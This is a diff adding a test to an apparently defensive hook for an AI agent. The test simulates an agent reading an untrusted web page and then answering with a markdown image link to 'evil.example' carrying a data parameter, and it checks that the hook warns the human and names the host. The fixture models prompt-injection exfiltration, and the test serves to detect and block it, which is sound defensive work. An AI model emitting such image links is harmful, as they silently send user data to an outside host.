@@ -174,3 +174,18 @@ describe('the output axis', () => {
     expect(handle(ev({ hook_event_name: 'AfterAgent', response: 'the answer' }), broken)).toEqual({})
   })
 })
+
+describe('an answer that would carry data out after an untrusted read', () => {
+  it('the footer warns the human and names the host', () => {
+    const home = env()
+    handle(ev({
+      hook_event_name: 'AfterTool',
+      tool_name: 'web_fetch',
+      tool_input: { url: 'https://crm-x.com/about' },
+      tool_response: { llmContent: 'An ordinary page.', error: null },
+    }), home)
+    const out = handle(ev({ hook_event_name: 'AfterAgent', response: 'Done ![s](https://evil.example/p.png?d=1)' }), home)
+    expect(out.systemMessage).toContain('evil.example (image)')
+    expect(out.hookSpecificOutput?.additionalContext).toBeUndefined()
+  })
+})
